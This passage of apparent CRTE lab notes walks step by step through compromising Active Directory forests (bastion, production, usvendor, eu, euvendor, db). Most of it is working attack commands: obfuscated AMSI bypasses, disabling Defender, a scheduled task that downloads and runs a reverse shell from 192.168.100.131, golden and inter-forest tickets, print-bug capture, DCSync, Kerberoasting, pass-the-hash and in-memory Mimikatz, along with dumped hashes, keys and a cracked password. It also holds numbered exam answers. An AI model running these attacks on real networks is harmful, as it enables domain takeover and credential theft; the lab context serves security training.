# aes256 :: 3f7b8bf044a600f3f7a8258d587e56d342f3baa7c27df03a58f3ec9c5a60bd44
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/0c0d0ce9-a19d-4299-b03e-e487866813ca)



2. Forge the inter-forest TGT
```powershell
PS> Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:techcorp.local /sid:S-1-5-21-2781415573-3701854478-2406986946 /sids:S-1-5-21-284138346-1733301406-1958478260-519 /rc4:052fd8c6017ae73d483552e538b19a59 /service:krbtgt /target:bastion.local /ticket:C:\ad\tools\dump\trust_tkt.kirbi"'
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/49a85e06-6eef-4e2f-b9db-4acfdb3c3754)



3. Create ticket and add it into the memory using asktgs
```powershell
PS> .\Rubeus.exe asktgs /ticket:C:\ad\tools\dump\trust_tkt.kirbi /service:cifs/bastion-dc.bastion.local /dc:bastion-dc.bastion.local /ptt
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4ad2b65f-5aaf-4ced-89f3-eade1b5189ac)



4. We can now access the shares on *BASTION-DC*
```powershell
PS> ls \\bastion-dc.bastion.local\C$
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/67e46816-b731-4a54-9f84-5df88c8eb317)


5. Setting a listener and creating a schedule task we can spawn a shell as *BASTION-DC*
```powershell
# terminal 1
PS> . .\powercat.ps1
PS> powercat -l -v -p 443 -t 1000

# create a file names amsi_bypass.ps1 having the following content
$w = 'System.Manag';$r = '65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e 41'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_};$c = ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAFUAdABpAGwAcwA=')));$assembly = [Ref].Assembly.GetType(('{0}{1}m{2}{3}' -f $w,$s,$c,$m));$b = 'siIn';$f = ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQA')));$field = $assembly.GetField(('am{0}it{1}' -f $b,$f),'NonPublic,Static');$field.SetValue($null,$true)

# add the following line at the end of Invoke-PowerShellTcpEx.ps1
reverse -Reverse -IPAddress 192.168.100.131 -Port 443

# host both Invoke-PowerShellTcpEx.ps1 and amsi_bypass.ps1
# create the scheduled task
PS> schtasks /create /S bastion-dc.bastion.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "owned" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.131/amsi_bypass.ps1''');powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.131/Invoke-PowerShellTcpEx.ps1''')"

# execute the task
PS> schtasks /Run /S bastion-dc.bastion.local /TN "owned"
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/eeb127fa-5925-44c8-88bb-4bb5359b3dc4)




## **Dump Credentials**
<hr>

+ Bypass amsi and use mimi to dump the ekeys
```powershell
PS> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

PS> iex(iwr -URI http://192.168.100.131/Invoke-Mimi.ps1 -UseBasicParsing)
Invoke-Mimi -Command '"sekurlsa::ekeys"'

# administrator of bastion-dc
# username :: Administrator 
# ntlm :: f29207796c9e6829aa1882b7cccfa36d 
# aes256 :: a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/da9ae714-cbba-4083-ac75-0661f2e1643f)




<h1 style='color:lightblue'> 12 - PRODUCTION-DC.PRODUCTION.LOCAL </h1>

## **PAM Trust - Shadow Principal**
<hr>

1. Enumerating trusts and hunting for access
```powershell
# get a session as bastion.local
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:administrator /domain:BASTION.LOCAL /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe"'
PS> C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"

# import the ad module
PS> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

# hunt for user access
PS> $bastiondc = New-PSSession bastion-dc.bastion.local
PS> Invoke-Command -ScriptBlock {Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local} -Session $bastiondc
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/524c3bb7-b3ec-4970-8cd1-1bfde980f68c)


2. Enumerate if there is a PAM trust
```powershell
PS> Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local} -Session $bastiondc

# OR 
PS> winrs -r:bastion-dc.bastion.local cmd
PS> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2f82f633-7e8c-4be6-884d-fcfab6c0d43c)



3. Check which users are members of the Shadow Principals
```powershell
PS> Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/bf03c15f-7a6c-4da2-9320-058d5b0e6dbe)



4. Run the below command on the bastion-dc to get IP of production.local DC
```powershell
PS> Get-DnsServerZone -ZoneName production.local |fl *
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9281b75c-18ce-4167-b1b7-80dc7bc39cb4)


5. To use PowerShell Remoting to connect to an IP address, we must modify the WSMan Trustedhosts property on the student VM. Run the below command in an elevated PowerShell on the student VM
```powershell
PS> Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```

6. Additionally, to connect to an IP address we have to use NTLM authentication. Therefore, we need to run OverPass-The-Hash with NTLM hash and not AES keys of the domain administrator of bastion.local
```powershell
PS> C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"

PS> Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e568c939-27bd-4f45-ac6d-5abc5ac321a0)



#### 55. Domain Administrator of techcorp.local is a member of which group in bastion.local?
```powershell
PS> # Administrators
```

#### 56. Name of Shadow Security Principal in bastion.local
```powershell
PS> # prodforest-ShadowEnterpriseAdmin
```

#### 57. Name of the user who is a member of Shadow Security Principals on bastion.local
```powershell
PS> # administrator
```

#### 58. IP Address of domain controller of production.local
```powershell
PS> # 192.168.102.1
```

#### 59. Authentication used to access production-dc using PowerShell Remoting
```powershell
PS> # NegotiateWithImplicitCredential
```

#### 60. What option can we use in Mimikatz (and similar tools) to pass AES256 keys?
```powershell
PS> # /aes256
```

#### 39. Name of the high privilege group whose SID history is injected in the TGT forged using Trust keys or krbtgt hash of us.techcorp.local
```powershell
PS> enterprise admins
```

<h1 style='color:lightblue'> 13 - USVENDOR-DC.USVENDOR.LOCAL </h1>

## **UnConstrained Delegation - Print Bug**
<hr>

1. We can use print bug exploit to capture the ticket of the DC. For this we can spawn two sessions as *US-WEB* where `rubeus.exe` will be set as monitor mode and on the other session we can use `MS-RPRN.exe` to force the *USVENDOR-DC* to connect to *WEB* and capture the ticket.
```powershell
# ps session as websmaster
Invoke-Mimi -Command '"sekurlsa::pth /user:webmaster /domain:US.TECHCORP.LOCAL /ntlm:23d6458d06b25e463b9666364fb0b29f /run:powershell.exe"'

# connect to us-jump
winrs -r:us-web cmd

# disable defender
PS> Set-MpPreference -DisableRealtimeMonitoring $true

# copy rubeus on the machine (terminal 1)
PS> echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Windows\Tasks\Rubeus.exe /Y

# set on monitor mode
PS> .\Rubeus.exe monitor /targetuser:USVENDOR-DC$ /interval:5 /nowrap

# copy MS-RPRN on the machine (terminal 2)
PS> echo F | xcopy C:\AD\Tools\MS-RPRN.exe \\us-web\C$\Windows\Tasks\MS-RPRN.exe /Y

# force the dc to connect to web
PS> .\MS-RPRN.exe \\USVENDOR-DC.USVENDOR.local \\us-web.us.techcorp.local
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ee978e93-7d50-49a3-8fe5-7ba93bebd9a4)



2. Using *Rubeus* we can inject the ticket into the session
```powershell
PS> C:\AD\Tools\Rubeus.exe ptt /ticket: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
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9abcbbb0-dadd-4cf9-9e41-a17dab1c6466)


3. Now we can perform a DC-Sync attack and dump the *krgtgt* and *administrator* hash
```powershell
# dumping krbtgt
PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User USVENDOR\krbtgt --Domain USVENDOR.local --DomainController USVENDOR-DC.USVENDOR.local

# dumping administrator
PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User USVENDOR\administrator --Domain USVENDOR.local --DomainController USVENDOR-DC.USVENDOR.local

# administrator
# ntml :: 67ad980708fe40f846c9397ec051020b 

# krbtgt
# ntlm :: 335caf1a29240a5dd318f79b6deaf03f   

# USVENDOR.local
# aes128 :: 71995c47735a10ea4a107bfe2bf38cb6  
# aes256 :: 2b0b8bf77286337369f38d1d72d3705fda18496989ab1133b401821684127
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/760e1438-d05e-48a9-ac2f-30b2d6b45e71)


![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1840fe4a-71ae-44de-a41a-e99dab0a9c16)



4. We can get a session as usvendor-dc
```powershell
# ps session as admin on usvendor
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:administrator /domain:USVENDOR.local /ntlm:67ad980708fe40f846c9397ec051020b /run:powershell.exe"'

# connect to us-vendor
PS> winrs -r:usvendor-dc.usvendor.local cmd

# bypass amsi
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# doenload and exec mimikatz
PS> iex(iwr -URI http://192.168.100.131/Invoke-Mimi.ps1 -UseBasicParsing)
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

#### 45. NTLM hash of the krbtgt account for usvendor.local
```powershell
PS> # 335caf1a29240a5dd318f79b6deaf03f
```

<h1 style='color:lightblue'> 14 - EU-DC.EU.LOCAL </h1>

## **Kerberoast - Cross Domain Attack**
<hr>

1. Create a golden ticket as an Enterprise Admin on *US.TECHCORP.LOCAL* . 
```powershell
# get the sid and the sids
PS> (Get-ADForest).Domains| %{Get-ADDomain -Server $_}|select name, domainsid

# techcorp :: S-1-5-21-2781415573-3701854478-2406986946
# US :: S-1-5-21-210670787-2521448726-163245708
# To convert back 
# "S-1-5-21-210670787-2521448726-163245708" | Convert-SidToName
# SID >> US
# SIDS >> TECHCORP - EA
# krgtgt :: b0975ae49f441adc6b024ad238935af5

PS> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d9cf7016-2498-4948-8e41-077aa4efc056)


2. Find user accounts used as Service account
```powershell
PS> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# Find user accounts used as Service account
# It is possible to execute Kerberoast across Forest trusts
PS> Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}

# name :: storagesvc
# spn :: eu-file.eu.local
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4d5bacab-996d-4942-aca6-1f59582836cf)


3. Request a TGS
```powershell
PS> C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f1c9c945-231a-417d-a49f-a31f9cf5ea17)


4. Crack the hash
```powershell
PS> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\dump\euhashes.txt
# password :: Qwerty@123
```

5.  Lets convert the password into the ntlm hash format
```powershell
PS> C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local

# ntlm :: 5C76877A9C454CDED58807C20C20AEAC 
# aes256 :: 4A0D89D845868AE3DCAB270FE23BEDD442A62C4CAD7034E4C60BEDA3C0F65E04 
# username :: storagesvc
# domain :: eu.local 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/94642087-897a-42d2-80d2-5a5a4181d759)



6. After spawning a new session as storagesvc we can enumerate users with constrained delegation enabled
```powershell
PS> C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:storagesvc /domain:eu.local /ntlm:5C76877A9C454CDED58807C20C20AEAC /ptt" "exit"

# start invisi shell and import AD Module
PS> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# enum for users
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ccedcd10-04da-4ef0-a69b-9b5d86bef3a9)



7. Request an alternate ticket using Rubeus
```powershell
PS> C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:"time/EU-DC.eu.local" /altservice:ldap /dc:eu-dc.eu.local /ptt
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5e7ae766-0dbd-491d-8b1e-ed8188fe6027)




8. Perform a DCSync Attack
```powershell
# ktbtgt
PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local

# admin hash
PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator - -Domain eu.local --DomainController eu-dc.eu.local

# Administrator 
# S-1-5-21-3657428294-2017276338-1274645009-500 
# ntlm :: fe422f818eb7e9c6de5862d94739c2e4
# aes256 :: 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d 

# krbtgt 
# S-1-5-21-3657428294-2017276338-1274645009-502 
# ntlm :: 83ac1bab3e98ce6ed70c9d5841341538 
# aes256 :: b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/263058ac-6eab-4d34-9ca6-08a477ebdfff)

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9ee0174c-1184-42bb-b14e-bc2db55f2fa7)



9. Spawn a session with the admin creds and get a session as *EU-DC*
```powershell
PS> C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:eu.local /ntlm:fe422f818eb7e9c6de5862d94739c2e4 /run:powershell.exe" "exit"

# checking for local admin access
PS> . .\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess -Verbose

# connect to the session
PS> winrs -r:EU-DC.EU.LOCAL cmd
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/81d36bd4-04a1-4627-8d96-e67efc6c532c)


#### 40. SPN that we keberoasted in eu.local
```powershell
PS> # MSSQLSvc/eu-file.eu.local
```

#### 41. Name of the user that we keberoasted in eu.local
```powershell
PS> # storagesvc
```

#### 42. Passworrd for storagesvc in eu.local
```powershell
PS> # Qwerty@123
```

#### 43. Name of the machine were storagesvc can access some services due to constrained delegation.
```powershell
PS> # EU-DC.eu.local
```

#### 44. AES256 keys for the administrator of eu.local
```powershell
PS> # 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d
```

<h1 style='color:lightblue'> 15 - EUVENDOR-DC.EUVENDOR.LOCAL </h1>

## **Forest Trust Key - SID Abuse**
<hr>

1. We require the trust key of inter-forest trust
```powershell
PS> C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:eu.local /ntlm:fe422f818eb7e9c6de5862d94739c2e4 /run:powershell.exe" "exit"

# connec to EU-DC
PS> winrs -r:EU-DC.EU.LOCAL cmd

# disable defender
PS> Set-MpPreference -DisableRealtimeMonitoring $true

# download mimi in memory and exec
PS> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.131/Invoke-Mimi.ps1')
PS> Invoke-Mimi -Command '"lsadump::trust /patch"'

# euvendor.local
# sid :: S-1-5-21-3657428294-2017276338-1274645009
# sids :: S-1-5-21-4066061358-3942393892-617142613-519
# rc4 :: 8bf1ea5c07c7d434bfcee8a502abe66f 
# aes256 :: 80155032526269f1db2b12c040383e08c775d9419652f0657d1c683078e5d5eb 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e0b8be95-6525-48b5-9be1-a6b400540f32)


2. Forge the inter-forest TGT
```powershell
# for reference again
# euvendor.local
# sid :: S-1-5-21-3657428294-2017276338-1274645009
# sids :: S-1-5-21-4066061358-3942393892-617142613-519
# rc4 :: 8bf1ea5c07c7d434bfcee8a502abe66f 
# aes256 :: 80155032526269f1db2b12c040383e08c775d9419652f0657d1c683078e5d5eb 


# disconnect first then transfer the file
# transfer rubeus and safteykatz
PS> echo F | xcopy C:\ad\tools\Rubeus.exe \\EU-DC.EU.LOCAL\C$\Windows\Tasks\Rubeus.exe /Y
PS> echo F | xcopy C:\ad\tools\BetterSafetyKatz.exe \\EU-DC.EU.LOCAL\C$\Windows\Tasks\BetterSafetyKatz.exe /Y

# connec to EU-DC
PS> winrs -r:EU-DC.EU.LOCAL cmd

# forge the inter forest ticket
PS> C:\Windows\Tasks\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-519 /rc4:8bf1ea5c07c7d434bfcee8a502abe66f /service:krbtgt /target:euvendor.local /ticket:C:\windows\tasks\trust_tkt.kirbi" "exit"
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e5255e6e-6c8f-4e2e-b1cf-d8c3f496e8b0)


3. Create ticket and add it into the memory using asktgs
```powershell
PS> C:\Windows\Tasks\Rubeus.exe asktgs /ticket:C:\windows\tasks\trust_tkt.kirbi /service:cifs/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# check the klist entries
PS> klist
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/959ed76f-7a1a-4a82-8e7d-e5f5ddde3607)



4.  Now we can access the *eushare*
```powershell
PS> ls \\euvendor-dc.euvendor.local\eushare
PS> cat \\euvendor-dc.euvendor.local\eushare\shared.txt
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6b3b78b3-817a-4fae-9c1f-32427e863e7a)


#### 46. Name of the share on euvednor-dc that we can access
```powershell
PS> # eushare
```

#### 47. The attribute for trust between eu.local and euvendor.local that shows SID History is enabled
```powershell
PS> # SIDFilteringForestAware
```

<h1 style='color:lightblue'> 16 - EUVENDOR-NET.EUVENDOR.LOCAL </h1>

## **Forest Trust Key - SID History**
<hr>

1. Check if there are any groups with SID>1000 in euvendor.local that we can impersonate to avoid SIDFiltering
```powershell
PS> C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:eu.local /ntlm:fe422f818eb7e9c6de5862d94739c2e4 /run:powershell.exe" "exit"

# Transfer invisi shell
PS> echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\eu-dc.eu.local\C$\Users\Public\InShellProf.dll /Y
PS> echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\eu-dc.eu.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y

# connect to eu-dc
PS> winrs -r:EU-DC.EU.LOCAL cmd

# execute the invisi shell
PS> C:\Users\Public\RunWithRegistryNonAdmin.bat

# search for the SID
# EUVENDOR SID >> S-1-5-21-4066061358-3942393892-617142613
PS> Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e94e8c05-520d-4168-8617-d628b9da2d7d)



2. Forge the inter-forest TGT
```powershell
PS> C:\windows\tasks\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /rc4:8bf1ea5c07c7d434bfcee8a502abe66f /service:krbtgt /target:euvendor.local /ticket:C:\windows\tasks\trust_tkt.kirbi" "exit"
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5bb33a8e-2d83-4a8a-baea-fd374f7799a8)



3. Create ticket and add it into the memory using asktgs
```powershell
PS> C:\windows\tasks\Rubeus.exe asktgs /ticket:C:\windows\tasks\trust_tkt.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e5151a76-e13d-4e6b-a392-2e399664673e)


4. Access *EUVendor-Net* using *winrs*
```powershell
PS> winrs -r:euvendor-net.euvendor.local cmd
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4284f379-7ab2-4c40-831f-d9130465067d)



#### 48. Name of the group that has SID > 1000 in euvendor.local
```powershell
PS> # EUADMINS
```

#### 49. SID History that we inject when forging TGT between eu.local and eudendor.local
```powershell
PS> # S-1-5-21-4066061358-3942393892-617142613-1103
```

#### 50. Name of the machine that we accessed by abusing SID History of EUAdmins group
```powershell
PS> # euvendor-net.euvendor.local
```

## **Dumping Hashes**
<hr>

+ Download and execute mimikatz in memory 
```powershell
PS> Set-MpPreference -DisableRealtimeMonitoring $true
PS> iex(iwr -URI http://192.168.100.131/Invoke-Mimi.ps1 -UseBasicParsing)
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'

# Username : EUVENDOR-NET$
# Domain   : euvendor.local
# Password : QU>^1e:B0(xZ7 Y1N7 Of 52EL<`"f3oe9IWpzs,w@O)*J`Z%S57[E0VW_@L&3e5]cX?NK-/I'$Z2/(m7x%9rh>Rt#am4zge%rv(L890X!?A.*uj;P^el F0
# rc4_hmac_nt :: 42b713f53b76c7614cd2812c40eb74da
# aes256_hmac :: cbcd3ce3bdb3b03bc85d54d3b115eb5ab5e3f2afa1576d0c6751f625943068b1
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/76325b5c-6f95-4ccb-82e6-f16f3727687f)



<h1 style='color:lightblue'> 17 - DB-SQLPROD.DB.LOCAL -> 18 - DB-SQLSRV.DB.LOCAL </h1>

## **Database Link Abuse**
<hr>

1. Let’s first enumerate database links on all the sql servers, we just need public access on for that. Let’s see if studentuser131 has that access on any database in the domain. We will use PowerUpSQL for this from InvisiShell
```powershell
PS> Import-Module .\PowerUpSQL.psd1

# enumerate SPN's
PS> Get-SQLInstanceDomain
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d8603823-1379-4700-9d57-7236a4a8a925)




2. Check Access
```powershell
PS> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c1764280-1a4a-47c3-82d7-2a195d4dd186)



3. We can see that the instance is accessible. We can check the privileges now.
```powershell
PS> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/be432a29-1cfb-439b-9aa7-004f8d0c0d57)



4. So we have non-sysadmin access to us-mssql. Let's enumerate database links for us-mssql
```powershell
PS> Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

